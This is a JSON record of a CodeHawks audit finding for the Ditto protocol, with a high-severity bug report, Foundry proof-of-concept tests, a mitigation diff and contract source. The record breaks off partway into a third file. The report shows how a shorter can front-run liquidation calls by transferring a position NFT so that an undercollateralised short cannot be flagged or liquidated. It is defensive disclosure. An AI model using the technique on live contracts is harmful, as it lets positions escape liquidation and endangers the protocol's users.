{
  "Title": "Owner of a bad ShortRecord can front-run flagShort calls AND liquidateSecondary and prevent liquidation",
  "Content": "# Owner of a bad ShortRecord can front-run flagShort calls AND liquidateSecondary and prevent liquidation\n\n### Severity\nHigh Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/MarginCallPrimaryFacet.sol#L47\">https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/MarginCallPrimaryFacet.sol#L47</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/AppStorage.sol#L101\">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/AppStorage.sol#L101</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ERC721Facet.sol#L162C17-L162C17\">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ERC721Facet.sol#L162C17-L162C17</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L132\">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L132</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L224C10-L224C10\">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L224C10-L224C10</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallPrimaryFacet.sol#L47C9-L47C9\">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallPrimaryFacet.sol#L47C9-L47C9</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallSecondaryFacet.sol#L64C25-L64C25\">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallSecondaryFacet.sol#L64C25-L64C25</a>\n\n\n## Summary\n\nA shorter can keep a unhealthy short position open by minting an NFT of it and front-running attempts to liquidate it with a transfer of this NFT (which transfers the short position to the new owner)\n\n## Vulnerability Details\n\nA Short Record (SR) is a struct representing a short position that has been opened by a user.\nIt holds different informations, such as how much collateral is backing the short, and how much debt it owe (this ratio is called Collateral Ratio or CR)\nAt any time, any user can flag someone's else SR as \"dangerous\", if its debt grows too much compared to its collateral.\nThis operation is accessible through `MarginCallPrimaryFacet::flagShort`, [which check through the `onlyValidShortRecord` modifier](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallPrimaryFacet.sol#L47C9-L47C9)  that the [SR isn't `Cancelled`]((https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/MarginCallPrimaryFacet.sol#L47))\nIf the SR is valid, then its debt/collateral ratio is verified, and if its below a specific threshold, flagged.\nBut that also means that if a SR is considered invalid, it cannot be flagged.\nAnd it seems there is a way for the owner of a SR to cancel its SR while still holding the position.\n\nThe owner of a SR can mint an NFT to represent it and make it transferable.\nThis is done in 5 steps:\n1) `TransferFrom` verify usual stuff regarding the NFT (ownership, allowance, valid receiver...)\n2) `LibShortRecord::transferShortRecord` [is called](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ERC721Facet.sol#L162C17-L162C17)\n3) [`transferShortRecord` verify](https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/MarginCallPrimaryFacet.sol#L47) that SR [is not `flagged` nor `Cancelled`](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/AppStorage.sol#L101)\n4) SR is [deleted](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L132) ([setting its status](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L224C10-L224C10) to `Cancelled`)\n5) a new SR is created with same parameters, but owned by the receiver.\n\nNow, let's see what would happen if Alice has a SR_1 with a bad CR, and Bob tries to flag it.\n\n1. Bob calls `flagShort`on SR_1, the tx is sent to the mempool\n\nAlice is watching the mempool, and don't want her SR to be flagged:\n\n2. She front-run Bob's tx with a transfer of her SR_1 to another of the addresses she controls\n\nNow Bob's tx will be executed after Alice's tx:\n\n3) The SR_1 is \"deleted\" and its status set to `Cancelled`\n4) Bob's tx is executed, and `flagShort` reverts because of the [`onlyValidShortRecord`](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallPrimaryFacet.sol#L47C9-L47C9)\n5) Alice can do this trick again to keep here undercol SR until it can become dangerous\n\nBut this is not over:\n\n6) Even when her CR drops dangerously (CR<1.5), `liquidateSecondary` is also DoS'd as it has [the same check](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallSecondaryFacet.sol#L64C25-L64C25) for `SR.Cancelled` \n\n## Impact\n\nBecause of this, a shorter could maintain the dangerous position (or multiple dangerous positions), while putting the protocol at risk.\n\n## Proof of Concept\n\nAdd these tests to `ERC721Facet.t.sol` :\n\n#### Front-running flag\n```solidity\n\tfunction test_audit_frontrunFlagShort() public {\n\t\taddress alice = makeAddr(\"Alice\"); //Alice will front-run Bob's attempt to flag her short\n\t\taddress aliceSecondAddr = makeAddr(\"AliceSecondAddr\");\n\t\taddress bob = makeAddr(\"Bob\"); //Bob will try to flag Alice's short \n\t\taddress randomUser = makeAddr(\"randomUser\"); //regular user who created a bid order\n\t\t\n\t\t//A random user create a bid, Alice create a short, which will match with the user's bid\n\t\tfundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, randomUser);\n\t\tfundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, alice);\n\t\t//Alice then mint the NFT associated to the SR so that it can be transfered\n\t\tvm.prank(alice);\n\t\tdiamond.mintNFT(asset, Constants.SHORT_STARTING_ID);\n\n\t\t//ETH price drops from 4000 to 2666, making Alice's short flaggable because its < LibAsset.primaryLiquidationCR(asset)\n\t\tsetETH(2666 ether);\n\t\t\n\t\t// Alice saw Bob attempt to flag her short, so she front-run him and transfer the SR\n\t\tvm.prank(alice);\n\t\tdiamond.transferFrom(alice, aliceSecondAddr, 1);\n\t\t\n\t\t//Bob's attempt revert because the transfer of the short by Alice change the short status to SR.Cancelled\n\t\tvm.prank(bob);\n\t\tvm.expectRevert(Errors.InvalidShortId.selector);\n\t\tdiamond.flagShort(asset, alice, Constants.SHORT_STARTING_ID, Constants.HEAD);\n\t}\t\n```\n\n#### Front-running liquidateSecondary\n```solidity\n    function test_audit_frontrunPreventFlagAndSecondaryLiquidation() public {\n\t\taddress alice = makeAddr(\"Alice\"); //Alice will front-run Bob's attempt to flag her short\n\t\taddress aliceSecondAddr = makeAddr(\"AliceSecondAddr\");\n\t\taddress aliceThirdAddr = makeAddr(\"AliceThirdAddr\");\n\t\taddress bob = makeAddr(\"Bob\"); //Bob will try to flag Alice's short \n\t\taddress randomUser = makeAddr(\"randomUser\"); //regular user who created a bid order\n\t\t\n\t\t//A random user create a bid, Alice create a short, which will match with the user's bid\n        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, randomUser);\n\t\tfundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, alice);\n\t\t//Alice then mint the NFT associated to the SR so that it can be transfered\n\t\tvm.prank(alice);\n        diamond.mintNFT(asset, Constants.SHORT_STARTING_ID);\n\n        //set cRatio below 1.1\n        setETH(700 ether);\n\t\t\n\t\t//Alice is still blocking all attempts to flag her short by transfering it to her secondary address by front-running Bob\n        vm.prank(alice);\n        diamond.transferFrom(alice, aliceSecondAddr, 1);\n\t\tvm.prank(bob);\n\t\tvm.expectRevert(Errors.InvalidShortId.selector);\n\t\tdiamond.flagShort(asset, alice, Constants.SHORT_STARTING_ID, Constants.HEAD);\n\n\t\t//Alice  front-run (again...) Bob and transfers the NFT to a third address she owns\n\t\tvm.prank(aliceSecondAddr);\n        diamond.transferFrom(aliceSecondAddr, aliceThirdAddr, 1);\n\n\t\t//Bob's try again on the new address, but its attempt revert because the transfer of the short by Alice change the short status to SR.Cancelled\n\t\tSTypes.ShortRecord memory shortRecord = getShortRecord(aliceSecondAddr, Constants.SHORT_STARTING_ID);\n\t\tdepositUsd(bob, shortRecord.ercDebt);\n        vm.expectRevert(Errors.MarginCallSecondaryNoValidShorts.selector);\n\t\tliquidateErcEscrowed(aliceSecondAddr, Constants.SHORT_STARTING_ID, DEFAULT_AMOUNT, bob);\n    }\n```\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nSR with a bad CR shouldn't be transferable, the user should first make its position healthy before being allowed to transfer it.\nI suggest to add a check in `LibShortRecord::transferShortRecord` to ensure `CR > primaryLiquidationCR\n\n```shell\ndiff --git a/contracts/libraries/LibShortRecord.sol b/contracts/libraries/LibShortRecord.sol\nindex 7c5ecc3..8fad274 100644\n--- a/contracts/libraries/LibShortRecord.sol\n+++ b/contracts/libraries/LibShortRecord.sol\n@@ -15,6 +15,7 @@ import {LibOracle} from \"contracts/libraries/LibOracle.sol\";\n // import {console} from \"contracts/libraries/console.sol\";\n\n library LibShortRecord {\n+    using LibShortRecord for STypes.ShortRecord;\n     using U256 for uint256;\n     using U88 for uint88;\n     using U80 for uint80;\n\n@@ -124,10 +125,16 @@ library LibShortRecord {\n         uint40 tokenId,\n         STypes.NFT memory nft\n     ) internal {\n\n+        AppStorage storage s = appStorage();\n         STypes.ShortRecord storage short = s.shortRecords[asset][from][nft.shortRecordId];\n         if (short.status == SR.Cancelled) revert Errors.OriginalShortRecordCancelled();\n         if (short.flaggerId != 0) revert Errors.CannotTransferFlaggedShort();\n+               if (\n+                       short.getCollateralRatioSpotPrice(LibOracle.getSavedOrSpotOraclePrice(asset))\n+                               < LibAsset.primaryLiquidationCR(asset)\n+        ) {\n+            revert Errors.InsufficientCollateral();\n+        }\n\n         deleteShortRecord(asset, from, nft.shortRecordId);\n\n```\n",
  "Impact": "HIGH",
  "Source": "https://www.codehawks.com/contests/clm871gl00001mp081mzjdlwc",
  "Code": [
    {
      "filename": "contracts/facets/MarginCallPrimaryFacet.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {U256, U96, U88, U80} from \"contracts/libraries/PRBMathHelper.sol\";\n\nimport {IDiamond} from \"interfaces/IDiamond.sol\";\n\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {Events} from \"contracts/libraries/Events.sol\";\nimport {STypes, MTypes, SR, OF} from \"contracts/libraries/DataTypes.sol\";\nimport {Modifiers} from \"contracts/libraries/AppStorage.sol\";\nimport {LibAsset} from \"contracts/libraries/LibAsset.sol\";\nimport {LibOrders} from \"contracts/libraries/LibOrders.sol\";\nimport {LibOracle} from \"contracts/libraries/LibOracle.sol\";\nimport {LibShortRecord} from \"contracts/libraries/LibShortRecord.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\n\n// import {console} from \"contracts/libraries/console.sol\";\n\ncontract MarginCallPrimaryFacet is Modifiers {\n    using LibShortRecord for STypes.ShortRecord;\n    using U256 for uint256;\n    using U96 for uint96;\n    using U88 for uint88;\n    using U80 for uint80;\n\n    address private immutable cusd;\n\n    constructor(address _cusd) {\n        cusd = _cusd;\n    }\n\n    /**\n     * @notice Flags short under primaryLiquidationCR to be eligible for liquidation after time has passed\n     * @dev Used to flag for primary liquidation method\n     *\n     * @param asset The market that will be impacted\n     * @param shorter Shorter getting liquidated\n     * @param id id of short getting liquidated\n     * @param flaggerHint Hint ID for gas-optimized update of short flagger\n     *\n     */\n    function flagShort(address asset, address shorter, uint8 id, uint16 flaggerHint)\n        external\n        isNotFrozen(asset)\n        nonReentrant\n        onlyValidShortRecord(asset, shorter, id)\n    {\n        if (msg.sender == shorter) revert Errors.CannotFlagSelf();\n        STypes.ShortRecord storage short = s.shortRecords[asset][shorter][id];\n        short.updateErcDebt(asset);\n\n        if (\n            short.getCollateralRatioSpotPrice(LibOracle.getSavedOrSpotOraclePrice(asset))\n                >= LibAsset.primaryLiquidationCR(asset)\n        ) {\n            revert Errors.SufficientCollateral();\n        }\n\n        uint256 adjustedTimestamp = LibOrders.getOffsetTimeHours();\n\n        // check if already flagged\n        if (short.flaggerId != 0) {\n            uint256 timeDiff = adjustedTimestamp - short.updatedAt;\n            uint256 resetLiquidationTime = LibAsset.resetLiquidationTime(asset);\n\n            if (timeDiff <= resetLiquidationTime) {\n                revert Errors.MarginCallAlreadyFlagged();\n            }\n        }\n\n        short.setFlagger(cusd, flaggerHint);\n        emit Events.FlagShort(asset, shorter, id, msg.sender, adjustedTimestamp);\n    }\n\n    /**\n     * @notice Liquidates short by forcing shorter to place bid on market\n     * @dev Primary liquidation method. Requires flag\n     * @dev Shorter will bear the cost of forcedBid on market\n     *\n     * @param asset The market that will be impacted\n     * @param shorter Shorter getting liquidated\n     * @param id Id of short getting liquidated\n     * @param shortHintArray Array of hintId for the id to start matching against shorts since you can't match a short < oracle price\n     *\n     * @return gasFee Estimated cost of gas for the forcedBid\n     * @return ethFilled Amount of eth filled in forcedBid\n     */\n    function liquidate(\n        address asset,\n        address shorter,\n        uint8 id,\n        uint16[] memory shortHintArray\n    )\n        external\n        isNotFrozen(asset)\n        nonReentrant\n        onlyValidShortRecord(asset, shorter, id)\n        returns (uint88, uint88)\n    {\n        if (msg.sender == shorter) revert Errors.CannotLiquidateSelf();\n\n        //@dev marginCall requires more up-to-date oraclePrice (15 min vs createLimitBid's 1 hour)\n        LibOrders.updateOracleAndStartingShortViaTimeBidOnly(\n            asset, OF.FifteenMinutes, shortHintArray\n        );\n\n        MTypes.MarginCallPrimary memory m = _setMarginCallStruct(asset, shorter, id);\n\n        if (m.cRatio >= LibAsset.primaryLiquidationCR(m.asset)) {\n            revert Errors.SufficientCollateral();\n        }\n\n        // revert if no asks, or price too high\n        _checklowestSell(m);\n\n        // check if within margin call time window\n        if (!_canLiquidate(m)) {\n            STypes.ShortRecord storage shortRecord = s.shortRecords[asset][shorter][id];\n            shortRecord.resetFlag();\n            return (0, 0);\n        }\n\n        _performForcedBid(m, shortHintArray);\n\n        _marginFeeHandler(m);\n\n        _fullorPartialLiquidation(m);\n        emit Events.Liquidate(asset, shorter, id, msg.sender, m.ercDebtMatched);\n\n        return (m.gasFee, m.ethFilled);\n    }\n\n    //PRIVATE FUNCTIONS\n\n    // Reverts if no eligible sells, or if lowest sell price is too high\n    // @dev startingShortId is updated via updateOracleAndStartingShortViaTimeBidOnly() prior to call\n    function _checklowestSell(MTypes.MarginCallPrimary memory m) private view {\n        uint16 lowestAskKey = s.asks[m.asset][Constants.HEAD].nextId;\n        uint16 startingShortId = s.asset[m.asset].startingShortId;\n        uint256 bufferPrice = m.oraclePrice.mul(m.forcedBidPriceBuffer);\n        if (\n            // Checks for no eligible asks\n            (\n                lowestAskKey == Constants.TAIL\n                    || s.asks[m.asset][lowestAskKey].price > bufferPrice\n            )\n            // Checks for no eligible shorts\n            && (\n                startingShortId == Constants.HEAD // means no short >= oracleprice\n                    || s.shorts[m.asset][startingShortId].price > bufferPrice\n            )\n        ) {\n            revert Errors.NoSells();\n        }\n    }\n\n    /**\n     * @notice Sets the memory struct m with initial data\n     *\n     * @param asset The market that will be impacted\n     * @param shorter Shorter getting liquidated\n     * @param id Id of short getting liquidated\n     *\n     * @return m Memory struct used throughout MarginCallPrimaryFacet.sol\n     */\n\n    function _setMarginCallStruct(address asset, address shorter, uint8 id)\n        private\n        returns (MTypes.MarginCallPrimary memory)\n    {\n        LibShortRecord.updateErcDebt(asset, shorter, id);\n        {\n            MTypes.MarginCallPrimary memory m;\n            m.asset = asset;\n            m.short = s.shortRecords[asset][shorter][id];\n            m.vault = s.asset[asset].vault;\n            m.shorter = shorter;\n            m.minimumCR = LibAsset.minimumCR(asset);\n            m.oraclePrice = LibOracle.getPrice(asset);\n            m.cRatio = m.short.getCollateralRatio(asset);\n            m.forcedBidPriceBuffer = LibAsset.forcedBidPriceBuffer(asset);\n            m.callerFeePct = LibAsset.callerFeePct(m.asset);\n            m.tappFeePct = LibAsset.tappFeePct(m.asset);\n            m.ethDebt = m.short.ercDebt.mul(m.oraclePrice).mul(m.forcedBidPriceBuffer).mul(\n                1 ether + m.tappFeePct + m.callerFeePct\n            ); // ethDebt accounts for forcedBidPriceBuffer and potential fees\n            return m;\n        }\n    }\n\n    /**\n     * @notice Handles the set up and execution of making a forcedBid\n     * @dev Shorter will bear the cost of forcedBid on market\n     * @dev Depending on shorter's cRatio, the TAPP can attempt to fund bid\n     *\n     * @param m Memory struct used throughout MarginCallPrimaryFacet.sol\n     * @param shortHintArray Array of hintId for the id to start matching against shorts since you can't match a short < oracle price\n     *\n     */\n\n    function _performForcedBid(\n        MTypes.MarginCallPrimary memory m,\n        uint16[] memory shortHintArray\n    ) private {\n        uint256 startGas = gasleft();\n        uint88 ercAmountLeft;\n\n        //@dev Provide higher price to better ensure it can fully fill the margin call\n        uint80 _bidPrice = m.oraclePrice.mulU80(m.forcedBidPriceBuffer);\n\n        // Shorter loses leftover collateral to TAPP when unable to maintain CR above the minimum\n        m.loseCollateral = m.cRatio <= m.minimumCR;\n\n        //@dev Increase ethEscrowed by shorter's full collateral for forced bid\n        s.vaultUser[m.vault][address(this)].ethEscrowed += m.short.collateral;\n\n        // Check ability of TAPP plus short collateral to pay back ethDebt\n        if (s.vaultUser[m.vault][address(this)].ethEscrowed < m.ethDebt) {\n            uint96 ercDebtPrev = m.short.ercDebt;\n            if (s.asset[m.asset].ercDebt <= ercDebtPrev) {\n                // Occurs when only one shortRecord in the asset (market)\n                revert Errors.CannotSocializeDebt();\n            }\n            m.loseCollateral = true;\n            // @dev Max ethDebt can only be the ethEscrowed in the TAPP\n            m.ethDebt = s.vaultUser[m.vault][address(this)].ethEscrowed;\n            // Reduce ercDebt proportional to ethDebt\n            m.short.ercDebt = uint88(\n                m.ethDebt.div(_bidPrice.mul(1 ether + m.callerFeePct + m.tappFeePct))\n            ); // @dev(safe-cast)\n            uint96 ercDebtSocialized = ercDebtPrev - m.short.ercDebt;\n            // Update ercDebtRate to socialize loss (increase debt) to other shorts\n            s.asset[m.asset].ercDebtRate +=\n                ercDebtSocialized.divU64(s.asset[m.asset].ercDebt - ercDebtPrev);\n        }\n\n        // @dev MarginCall contract will be the caller. Virtual accounting done later for shorter or TAPP\n        (m.ethFilled, ercAmountLeft) = IDiamond(payable(address(this))).createForcedBid(\n            address(this), m.asset, _bidPrice, m.short.ercDebt, shortHintArray\n        );\n\n        m.ercDebtMatched = m.short.ercDebt - ercAmountLeft;\n\n        //@dev virtually burning the repurchased debt\n        s.assetUser[m.asset][address(this)].ercEscrowed -= m.ercDebtMatched;\n        s.asset[m.asset].ercDebt -= m.ercDebtMatched;\n\n        uint256 gasUsed = startGas - gasleft();\n        //@dev manually setting basefee to 1,000,000 in foundry.toml;\n        //@dev By basing gasFee off of baseFee instead of priority, adversaries are prevent from draining the TAPP\n        m.gasFee = uint88(gasUsed * block.basefee); // @dev(safe-cast)\n    }\n\n    /**\n     * @notice Handles the distribution of marginFee\n     * @dev MarginFee is taken into consideration when determining black swan\n     *\n     * @param m Memory struct used throughout MarginCallPrimaryFacet.sol\n     *\n     */\n    function _marginFeeHandler(MTypes.MarginCallPrimary memory m) private {\n        STypes.VaultUser storage VaultUser = s.vaultUser[m.vault][msg.sender];\n        STypes.VaultUser storage TAPP = s.vaultUser[m.vault][address(this)];\n        // distribute fees to TAPP and caller\n        uint88 tappFee = m.ethFilled.mulU88(m.tappFeePct);\n        uint88 callerFee = m.ethFilled.mulU88(m.callerFeePct) + m.gasFee;\n\n        m.totalFee += tappFee + callerFee;\n        //@dev TAPP already received the gasFee for being the forcedBid caller. tappFee nets out.\n        if (TAPP.ethEscrowed >= callerFee) {\n            TAPP.ethEscrowed -= callerFee;\n            VaultUser.ethEscrowed += callerFee;\n        } else {\n            // Give caller (portion of?) tappFee instead of gasFee\n            VaultUser.ethEscrowed += callerFee - m.gasFee + tappFee;\n            m.totalFee -= m.gasFee;\n            TAPP.ethEscrowed -= m.totalFee;\n        }\n    }\n\n    function min88(uint256 a, uint88 b) private pure returns (uint88) {\n        if (a > type(uint88).max) revert Errors.InvalidAmount();\n        return a < b ? uint88(a) : b;\n    }\n\n    /**\n     * @notice Handles accounting in event of full or partial liquidations\n     *\n     * @param m Memory struct used throughout MarginCallPrimaryFacet.sol\n     *\n     */\n    function _fullorPartialLiquidation(MTypes.MarginCallPrimary memory m) private {\n        uint88 decreaseCol = min88(m.totalFee + m.ethFilled, m.short.collateral);\n\n        if (m.short.ercDebt == m.ercDebtMatched) {\n            // Full liquidation\n            LibShortRecord.disburseCollateral(\n                m.asset,\n                m.shorter,\n                m.short.collateral,\n                m.short.zethYieldRate,\n                m.short.updatedAt\n            );\n            LibShortRecord.deleteShortRecord(m.asset, m.shorter, m.short.id);\n            if (!m.loseCollateral) {\n                m.short.collateral -= decreaseCol;\n                s.vaultUser[m.vault][m.shorter].ethEscrowed += m.short.collateral;\n                s.vaultUser[m.vault][address(this)].ethEscrowed -= m.short.collateral;\n            }\n        } else {\n            // Partial liquidation\n            m.short.ercDebt -= m.ercDebtMatched;\n            m.short.collateral -= decreaseCol;\n            s.shortRecords[m.asset][m.shorter][m.short.id] = m.short;\n\n            s.vaultUser[m.vault][address(this)].ethEscrowed -= m.short.collateral;\n            LibShortRecord.disburseCollateral(\n                m.asset, m.shorter, decreaseCol, m.short.zethYieldRate, m.short.updatedAt\n            );\n\n            // TAPP absorbs leftover short, unless it already owns the short\n            if (m.loseCollateral && m.shorter != address(this)) {\n                // Delete partially liquidated short\n                LibShortRecord.deleteShortRecord(m.asset, m.shorter, m.short.id);\n                // Absorb leftovers into TAPP short\n                LibShortRecord.fillShortRecord(\n                    m.asset,\n                    address(this),\n                    Constants.SHORT_STARTING_ID,\n                    SR.FullyFilled,\n                    m.short.collateral,\n                    m.short.ercDebt,\n                    s.asset[m.asset].ercDebtRate,\n                    m.short.zethYieldRate\n                );\n            }\n        }\n    }\n\n    /**\n     * @notice Helper that evaluates if a short is eligible for liquidation (i.e. flagged and within appropriate time frame)\n     * @dev Shorter has 10 hours after initial flag to bring cRatio up above maintainence margin...\n     * @dev ...After that, the flagger has 2 hours to liquidate the shorter. If short is not liquidated by shorter within that time, ANYBODY can then liquidate...\n     * @dev ...After 16 total hours have passed and the short has not been liquidated, the flag gets reset and the flagging process begins anew\n     *\n     * @param m Memory struct used throughout MarginCallPrimaryFacet.sol\n     *\n     */\n    // check if within margin call time window\n    function _canLiquidate(MTypes.MarginCallPrimary memory m)\n        private\n        view\n        returns (bool)\n    {\n        //@dev if cRatio is below the minimumCR, allow liquidation regardless of flagging\n        if (m.cRatio < m.minimumCR) return true;\n\n        //@dev Only check if flagger is empty, not updatedAt\n        if (m.short.flaggerId == 0) {\n            revert Errors.ShortNotFlagged();\n        }\n\n        /*\n         * Timeline: \n         * \n         * updatedAt (~0 hrs)\n         * ..\n         * [Errors.MarginCallIneligibleWindow]\n         * ..\n         * firstLiquidationTime (~10hrs, +10 hrs)\n         * ..\n         * [return msg.sender == short.flagger]\n         * ..\n         * secondLiquidationTime (~12hrs, +2 hrs)\n         * ..\n         * [return true (msg.sender is anyone)]\n         * ..\n         * resetLiquidationTime (~16hrs, +4 hrs)\n         * ..\n         * [return false (reset flag)]\n        */\n\n        uint256 timeDiff = LibOrders.getOffsetTimeHours() - m.short.updatedAt;\n        uint256 resetLiquidationTime = LibAsset.resetLiquidationTime(m.asset);\n\n        if (timeDiff >= resetLiquidationTime) {\n            return false;\n        } else {\n            uint256 secondLiquidationTime = LibAsset.secondLiquidationTime(m.asset);\n            bool isBetweenFirstAndSecondLiquidationTime = timeDiff\n                > LibAsset.firstLiquidationTime(m.asset) && timeDiff <= secondLiquidationTime\n                && s.flagMapping[m.short.flaggerId] == msg.sender;\n            bool isBetweenSecondAndResetLiquidationTime =\n                timeDiff > secondLiquidationTime && timeDiff <= resetLiquidationTime;\n            if (\n                !(\n                    (isBetweenFirstAndSecondLiquidationTime)\n                        || (isBetweenSecondAndResetLiquidationTime)\n                )\n            ) {\n                revert Errors.MarginCallIneligibleWindow();\n            }\n\n            return true;\n        }\n    }\n}"
    },
    {
      "filename": "contracts/libraries/AppStorage.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {STypes, F, SR} from \"contracts/libraries/DataTypes.sol\";\nimport {LibDiamond} from \"contracts/libraries/LibDiamond.sol\";\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\n\n// import {console} from \"contracts/libraries/console.sol\";\n\nstruct AppStorage {\n    address admin;\n    address ownerCandidate;\n    address baseOracle;\n    uint24 flaggerIdCounter;\n    uint40 tokenIdCounter; //NFT - As of 2023, Ethereum had ~2B total tx. Uint40 max value is 1T, which is more than enough for NFTs\n    uint8 reentrantStatus;\n    // ZETH\n    mapping(address zeth => uint256 vault) zethVault;\n    // Bridge\n    mapping(address bridge => STypes.Bridge) bridge;\n    // Vault\n    mapping(uint256 vault => STypes.Vault) vault;\n    mapping(uint256 vault => address[]) vaultBridges;\n    mapping(uint256 vault => mapping(address account => STypes.VaultUser)) vaultUser;\n    // Assets\n    mapping(address asset => STypes.Asset) asset;\n    mapping(address asset => mapping(address account => STypes.AssetUser)) assetUser;\n    // Assets - Orderbook\n    mapping(address asset => mapping(uint16 id => STypes.Order)) bids;\n    mapping(address asset => mapping(uint16 id => STypes.Order)) asks;\n    mapping(address asset => mapping(uint16 id => STypes.Order)) shorts;\n    mapping(\n        address asset\n            => mapping(address account => mapping(uint8 id => STypes.ShortRecord))\n        ) shortRecords;\n    mapping(uint24 flaggerId => address flagger) flagMapping;\n    // ERC721\n    mapping(uint256 tokenId => STypes.NFT) nftMapping;\n    mapping(uint256 tokenId => address) getApproved;\n    mapping(address owner => mapping(address operator => bool)) isApprovedForAll;\n    // ERC721 - Assets\n    address[] assets;\n    mapping(uint256 assetId => address) assetMapping;\n    // ERC721 - METADATA STORAGE/LOGIC\n    string name;\n    string symbol;\n}\n\nfunction appStorage() pure returns (AppStorage storage s) {\n    // solhint-disable-next-line no-inline-assembly\n    assembly {\n        s.slot := 0\n    }\n}\n\ncontract Modifiers {\n    AppStorage internal s;\n\n    modifier onlyDAO() {\n        LibDiamond.enforceIsContractOwner();\n        _;\n    }\n\n    modifier onlyAdminOrDAO() {\n        if (msg.sender != LibDiamond.contractOwner() && msg.sender != s.admin) {\n            revert Errors.NotOwnerOrAdmin();\n        }\n        _;\n    }\n\n    modifier onlyDiamond() {\n        if (msg.sender != address(this)) revert Errors.NotDiamond();\n        _;\n    }\n\n    modifier onlyValidAsset(address asset) {\n        if (s.asset[asset].vault == 0) revert Errors.InvalidAsset();\n        _;\n    }\n\n    modifier isNotFrozen(address asset) {\n        if (s.asset[asset].frozen != F.Unfrozen) revert Errors.AssetIsFrozen();\n        _;\n    }\n\n    modifier isPermanentlyFrozen(address asset) {\n        if (s.asset[asset].frozen != F.Permanent) {\n            revert Errors.AssetIsNotPermanentlyFrozen();\n        }\n        _;\n    }\n\n    function _onlyValidShortRecord(address asset, address shorter, uint8 id)\n        internal\n        view\n    {\n        uint8 maxId = s.assetUser[asset][shorter].shortRecordId;\n        if (id >= maxId) revert Errors.InvalidShortId();\n        if (id < Constants.SHORT_STARTING_ID) revert Errors.InvalidShortId();\n        if (s.shortRecords[asset][shorter][id].status == SR.Cancelled) {\n            revert Errors.InvalidShortId();\n        }\n    }\n\n    modifier onlyValidShortRecord(address asset, address shorter, uint8 id) {\n        _onlyValidShortRecord(asset, shorter, id);\n        _;\n    }\n\n    modifier nonReentrant() {\n        if (s.reentrantStatus == Constants.ENTERED) revert Errors.ReentrantCall();\n        s.reentrantStatus = Constants.ENTERED;\n        _;\n        s.reentrantStatus = Constants.NOT_ENTERED;\n    }\n\n    modifier nonReentrantView() {\n        if (s.reentrantStatus == Constants.ENTERED) revert Errors.ReentrantCallView();\n        _;\n    }\n\n    modifier onlyValidBridge(address bridge) {\n        if (s.bridge[bridge].vault == 0) revert Errors.InvalidBridge();\n        _;\n    }\n}"
    },
    {
      "filename": "contracts/facets/ERC721Facet.sol",
